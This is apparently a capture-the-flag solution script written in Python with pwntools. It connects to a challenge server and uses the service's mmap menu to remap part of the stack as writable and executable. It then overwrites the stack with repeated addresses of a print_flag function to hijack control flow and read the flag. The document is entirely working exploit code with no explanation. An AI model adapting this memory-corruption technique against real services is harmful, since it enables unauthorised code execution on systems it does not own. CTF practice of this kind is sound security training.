#!/usr/bin/env python3

from pwn import *
import re

context(arch='amd64', os='linux')

HOST = '35.217.19.7'
#HOST = 'localhost'
PORT = 50000

def menu(r, choice):
    r.recvline_contains('4. exit')
    r.recvline_contains('>')
    r.sendline(str(choice))

elf = ELF('./container/karta-fixad')
#r = elf.process()
r = remote(HOST, PORT)

menu(r, 3)
mapping = r.recvuntil('1. mmap').decode('ascii')[:-len('1. mmap')]
#print(mapping)
for mapping_entry in mapping.split('\n'):
    if '[stack]' in mapping_entry:
        stack_range = mapping_entry.split()[0]
        stack_base, stack_end = stack_range.split('-')
        stack_base = int(stack_base, 16)
        stack_end = int(stack_end, 16)
        stack_size = stack_end - stack_base
        break
else:
    log.error('Stack base not found')

log.info('Stack: %#10x-%#10x (%x)', stack_base, stack_end, stack_size)

menu(r, 1)
r.recvuntil("addr: ")
r.sendline(str(stack_end - 0x4000))
r.recvuntil("length: ")
r.sendline(str(0x1000))
r.recvuntil("prot: ")
r.sendline(str(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC))
r.recvuntil("flags: ")
r.sendline(str(constants.MAP_PRIVATE | constants.MAP_ANONYMOUS | constants.MAP_FIXED))
r.recvuntil("fd: ")
r.sendline(str(-1))
r.recvuntil("offset: ")
r.sendline(str(0))
mmap_addr = int(r.recvline().decode('ascii').strip(), 16)
log.info('mmap address: %#10x', mmap_addr)

menu(r, 2)
r.recvuntil('Hur mycket vill du skriva?')

payload = b''
payload += p64(elf.symbols['print_flag']) * (0x4000//8)
r.sendline(str(len(payload)))
#pause()
r.send(payload)

response = r.recv(0x1000)
flag = re.match(rb'SSM{.*}', response).group(0).decode('ascii')
log.info('Flag: %s', flag)
